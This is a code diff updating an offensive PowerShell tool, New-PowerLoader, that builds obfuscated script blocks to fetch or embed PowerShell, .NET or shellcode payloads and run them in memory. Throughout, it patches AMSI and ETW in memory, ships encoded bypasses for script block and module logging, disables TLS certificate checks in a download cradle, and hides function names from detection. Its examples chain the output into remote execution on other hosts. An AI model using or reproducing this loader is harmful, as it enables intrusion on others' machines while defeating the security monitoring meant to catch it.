@@ -1,15 +1,18 @@
-function New-PowerLoader {
+#requires -version 3
+
+Function New-PowerLoader {
 <#
 .SYNOPSIS
-    Build script block which safely loads PowerShell, .NET assembly and shellcode.
+    Build script block which safely loads PowerShell, .NET assembly or shellcode.
 
     Author: Timothee MENOCHET (@_tmenochet)
 
 .DESCRIPTION
-    New-PowerLoader returns PowerShell script block embedding download cradle or local file as payload.
+    New-PowerLoader builds PowerShell script block embedding download cradle or local file as payload.
+    Resulting script block is fully compatible with PowerShell v2.
 
 .PARAMETER Type
-    Specifies the payload type, defaults to PoSH.
+    Specifies the payload type, defaults to PoSh.
 
 .PARAMETER FilePath
     Specifies a local payload.
@@ -30,7 +33,7 @@ function New-PowerLoader {
     PS C:\> New-PowerLoader -Type PoSh -FileUrl 'https://192.168.0.1/script.ps1' -ArgumentList 'Invoke-Sample','-Verbose' -Bypass SBL,PML
 
 .EXAMPLE
-    PS C:\> New-PowerLoader -Type NetAsm -FilePath .\sharp.exe -Bypass ETW,AMSI | Invoke-PowerExec -ComputerList 192.168.0.2
+    PS C:\> New-PowerLoader -Type NetAsm -FilePath .\SharpSample.exe -Bypass ETW,AMSI | Invoke-PowerExec -ComputerList 192.168.0.2
 #>
     [CmdletBinding()]
     Param (
@@ -68,11 +71,11 @@ function New-PowerLoader {
         $srcCode += '$code = Get-DecodedByte("' + $encCode + '") | foreach {$_ -bxor 1}' + [Environment]::NewLine
     }
     elseif ($FileUrl) {
-        $srcCode += ${function:Invoke-DownloadCradle}.Ast.Extent.Text + [Environment]::NewLine
+        $srcCode += ${function:Invoke-DownloadByte}.Ast.Extent.Text + [Environment]::NewLine
         $bytes = [Text.Encoding]::UTF8.GetBytes($FileUrl)
         $bytes = $bytes | foreach {$_ -bxor 1}
         $encUrl = Get-EncodedByte($bytes)
-        $srcCode += '$code = Invoke-DownloadCradle([Text.Encoding]::UTF8.GetString((Get-DecodedByte("' + $encUrl + '") | foreach {$_ -bxor 1})))' + [Environment]::NewLine
+        $srcCode += '$code = Invoke-DownloadByte([Text.Encoding]::UTF8.GetString((Get-DecodedByte("' + $encUrl + '") | foreach {$_ -bxor 1})))' + [Environment]::NewLine
         if ($ClearComments -and $Type -eq "PoSh") {
             $srcCode += ${function:Remove-PoshComments}.Ast.Extent.Text + [Environment]::NewLine
             $srcCode += '$code = Remove-PoshComments($code)' + [Environment]::NewLine
@@ -94,28 +97,28 @@ function New-PowerLoader {
     }
 
     $srcBypass = ''
-    if ($Bypass -and ($Bypass.Contains('AMSI') -or $Bypass.Contains('ETW'))) {
+    if ($Bypass -Contains 'AMSI' -or $Bypass -Contains 'ETW') {
         $srcBypass += ${function:Invoke-MemoryPatch}.Ast.Extent.Text + [Environment]::NewLine
     }
     switch ($Bypass) {
         'AMSI' {
             $srcBypass += '$d = ([Text.Encoding]::UTF8.GetString((Get-DecodedByte("H4sIAAAAAAAEAEvIKcrQT83NBQCpd2pDCAAAAA==") | foreach {$_ -bxor 1})))' + [Environment]::NewLine
             $srcBypass += '$f = ([Text.Encoding]::UTF8.GetString((Get-DecodedByte("H4sIAAAAAAAEAHPIKcoISkrIdy5JT08pBgCSRCbiDgAAAA==") | foreach {$_ -bxor 1})))' + [Environment]::NewLine
-            $srcBypass += 'if ([Environment]::Is64BitOperatingSystem) {$p = (Get-DecodedByte("H4sIAAAAAAAEANsZxsjWeAgANMiX0AYAAAA=") | foreach {$_ -bxor 1})} else {$p = (Get-DecodedByte("H4sIAAAAAAAEANsZxsjWeFiSEQCkiImCCAAAAA==") | foreach {$_ -bxor 1})}' + [Environment]::NewLine
+            $srcBypass += 'if ([IntPtr]::Size -eq 4) {$p = (Get-DecodedByte("H4sIAAAAAAAEANsZxsjWeFiSEQCkiImCCAAAAA==") | foreach {$_ -bxor 1})} else {$p = (Get-DecodedByte("H4sIAAAAAAAEANsZxsjWeAgANMiX0AYAAAA=") | foreach {$_ -bxor 1})}' + [Environment]::NewLine
             $srcBypass += 'Invoke-MemoryPatch -Dll $d -Func $f -Patch $p' + [Environment]::NewLine
         }
         'ETW' {
             $srcBypass += '$d = ([Text.Encoding]::UTF8.GetString((Get-DecodedByte("H4sIAAAAAAAEAMsvTc3N1QdiALm3ONgJAAAA") | foreach {$_ -bxor 1})))' + [Environment]::NewLine
             $srcBypass += '$f = ([Text.Encoding]::UTF8.GetString((Get-DecodedByte("H4sIAAAAAAAEAHMpLXMpT8kvDSvOKE0BAGFTlzkNAAAA") | foreach {$_ -bxor 1})))' + [Environment]::NewLine
-            $srcBypass += 'if ([Environment]::Is64BitOperatingSystem) {$p = [byte[]] (0xC3)} else {$p = [byte[]] (0xC2, 0x14, 0x00, 0x00)}' + [Environment]::NewLine
+            $srcBypass += 'if ([IntPtr]::Size -eq 4) {$p = [byte[]] (0xC2, 0x14, 0x00, 0x00)} else {$p = [byte[]] (0xC3)}' + [Environment]::NewLine
             $srcBypass += 'Invoke-MemoryPatch -Dll $d -Func $f -Patch $p' + [Environment]::NewLine
         }
         'SBL' {
-            $srcBypass += '$b = "H4sIAAAAAAAEADWOUUsDMRCEf8s9GO6gR/5CUVAEsXhihdKHJdmmW71NuE1WQumPNyf4OMN8M6O5Xg/veD7arQjOnqt9RP2oCw5mqqI42xdIEHDGpHZbNM6gFJOdXKZFHzi6L9OvzBMhnwYjFBJoyShmNLuY3opncqNow1xLTqifwAWHu1SYx2GHP5tX/41Ou//B+8jcdFuRVpwwk7PPIJeGHkQzpXA0fX9zoO5y3WdS3Owhp+a3ir9bnV9/dRxDWF1fFxDpzkCMJ2tuvxHo1jL1AAAA"' + [Environment]::NewLine
+            $srcBypass += '$b = "H4sIAAAAAAAEABXMQQrCMBCF4bO4MLRgyRWKgiKIxYoIpYuQjjXVTEInGQnSwxt3b/G+n0P6dld49rImAjtgknvgW5qhFG0iBitPyqsRLHiWdWRnFRvnZauDmXmHTr9E8TcHA/goBZnRK44BSFSicf4SBzS6Is5M52cLfFcYoVz7iFiVDXw25+ENmldi6xDzyHnKRQ/BaHlUNGXTEQfjx14UxaIV6+m7/ADzwv6nuwAAAA=="' + [Environment]::NewLine
             $srcBypass += 'IEX ([Text.Encoding]::UTF8.GetString((Get-DecodedByte($b) | foreach {$_ -bxor 1})))' + [Environment]::NewLine
         }
         'PML' {
-            $srcBypass += '$b = "H4sIAAAAAAAEANN0SynV8clLLclNUfTJSCrOK8pLL9UPzCtLKQ7KTMnN1Q8pzcjNKK3Q0PfNSwvMKEzJzchPcalMSSopzcjLd00pTcjILbJRTU/ILUqx0gQZFhgUlJ9QmJGP3TinvOIUYswCAC6sebGYAAAA"' + [Environment]::NewLine
+            $srcBypass += '$b = "H4sIAAAAAAAEAI3MsQqDMBAG4GfpIFQoZC+dxDrZIaEPEMKvnsNdMPFExYcXOjv0e4BP87qXDfTRSjczbi2FLEkGNVYWZDeC2XyVmHS9m4/0liYwRdQbwqwk8Q31xOlVDJ4Tnr/MOhf9RPG6qyTjn+sIXsO4HydzXsS6pAAAAA=="' + [Environment]::NewLine
             $srcBypass += 'IEX ([Text.Encoding]::UTF8.GetString((Get-DecodedByte($b) | foreach {$_ -bxor 1})))' + [Environment]::NewLine
         }
     }
@@ -130,17 +133,17 @@ function New-PowerLoader {
             $srcLoader += 'Invoke-NetLoader -Code $code -ArgumentList $args'
         }
         'Shellcode' {
-            $srcLoader = ${function:Invoke-ShellcodeLoader}.Ast.Extent.Text + [Environment]::NewLine
-            $srcLoader += 'Invoke-ShellcodeLoader -Code $code'
+            $srcLoader = ${function:Invoke-ShellLoader}.Ast.Extent.Text + [Environment]::NewLine
+            $srcLoader += 'Invoke-ShellLoader -Code $code'
         }
     }
     $script = $srcCode + $srcArgs + $srcBypass + $srcLoader
-    $words = @('Get-DecodedByte','Invoke-DownloadCradle','Invoke-MemoryPatch','Invoke-PoshLoader','Invoke-NetLoader','Invoke-ShellcodeLoader','Remove-PoshComments')
+    $words = @('Get-DecodedByte','Copy-Stream','Invoke-DownloadByte','Invoke-MemoryPatch','Invoke-PoshLoader','Invoke-NetLoader','Invoke-ShellLoader','Remove-PoshComments')
     $script = Get-ObfuscatedString -InputString $script -BlackList $words
     return [ScriptBlock]::Create($script)
 }
 
-function Local:Remove-PoshComments {
+Function Local:Remove-PoshComments {
     Param (
         [byte[]] $Bytes
     )
@@ -156,7 +159,7 @@ function Local:Remove-PoshComments {
     return $byteArray
 }
 
-function Local:Get-ObfuscatedString {
+Function Local:Get-ObfuscatedString {
     Param (
         [String] $InputString,
         [String[]] $BlackList
@@ -169,7 +172,7 @@ function Local:Get-ObfuscatedString {
     return $InputString
 }
 
-function Local:Get-EncodedByte {
+Function Local:Get-EncodedByte {
     Param (
         [Parameter(Mandatory = $True)]
         [byte[]] $ByteArray
@@ -184,23 +187,29 @@ function Local:Get-EncodedByte {
     return [Convert]::ToBase64String($out)
 }
 
-function Local:Get-DecodedByte {
+Function Local:Get-DecodedByte {
     Param (
         [Parameter(Mandatory = $True)]
         [string] $EncBytes
     )
 
+    Function Copy-Stream ($InputStream,$OutputStream) {
+        $buffer = New-Object byte[] 4096
+        while (($bytesRead = $InputStream.Read($buffer, 0, $buffer.Length)) -gt 0) {
+            $OutputStream.Write($buffer, 0, $bytesRead)
+        }
+    }
     $byteArray = [Convert]::FromBase64String($EncBytes)
     $input = New-Object IO.MemoryStream(,$byteArray)
     $output = New-Object IO.MemoryStream
     $gzipStream = New-Object IO.Compression.GzipStream $input, ([IO.Compression.CompressionMode]::Decompress)
-    $gzipStream.CopyTo($output)
+    Copy-Stream -InputStream $gzipStream -OutputStream $output
     $gzipStream.Close()
     $input.Close()
     return $output.ToArray()
 }
 
-function Local:Invoke-MemoryPatch {
+Function Local:Invoke-MemoryPatch {
     Param (
         [string] $Dll,
         [string] $Func,
@@ -226,14 +235,14 @@ public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint 
         [Runtime.InteropServices.Marshal]::Copy($Patch, 0, $address, [UInt32]$Patch.Length)
     }
     catch {
-        Write-Error "Memory patch failed."
+        Write-Warning "Memory patch failed."
     }
     finally {
         [Kernel32]::VirtualProtect($address, [UInt32]$Patch.Length, $a, [ref]0) | Out-Null
     }
 }
 
-function Local:Invoke-DownloadCradle {
+Function Local:Invoke-DownloadByte {
     Param (
         [Parameter(Mandatory=$True)]
         [string] $URL
@@ -242,11 +251,16 @@ function Local:Invoke-DownloadCradle {
     $code = $null
     try {
         [Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
-        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+        try {
+            [Net.ServicePointManager]::SecurityProtocol = [Enum]::ToObject([Net.SecurityProtocolType], 3072)
+        }
+        catch {
+            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls
+        }
         $client = [Net.WebRequest]::Create($URL)
         $client.Proxy = [Net.WebRequest]::GetSystemWebProxy()
         $client.Proxy.Credentials = [Net.CredentialCache]::DefaultCredentials
-        $client.UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::InternetExplorer
+        $client.UserAgent = 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT; Windows NT 10.0; en-US)'
         $response = $client.GetResponse()
         $respStream = $response.GetResponseStream()
         $buffer = New-Object byte[] $response.ContentLength
@@ -267,7 +281,7 @@ function Local:Invoke-DownloadCradle {
     return $code
 }
 
-function Local:Invoke-PoshLoader {
+Function Local:Invoke-PoshLoader {
     Param (
         [Parameter(Mandatory=$True)]
         [ValidateNotNullOrEmpty()]
@@ -279,7 +293,7 @@ function Local:Invoke-PoshLoader {
     Invoke-Expression "$Code $($ArgumentList -join ' ')"
 }
 
-function Local:Invoke-NetLoader {
+Function Local:Invoke-NetLoader {
     Param (
         [Parameter(Mandatory=$True)]
         [ValidateNotNullOrEmpty()]
@@ -304,7 +318,7 @@ function Local:Invoke-NetLoader {
     }
 }
 
-function Local:Invoke-ShellcodeLoader {
+Function Local:Invoke-ShellLoader {
     Param (
         [Parameter(Mandatory=$True)]
         [ValidateNotNullOrEmpty()]
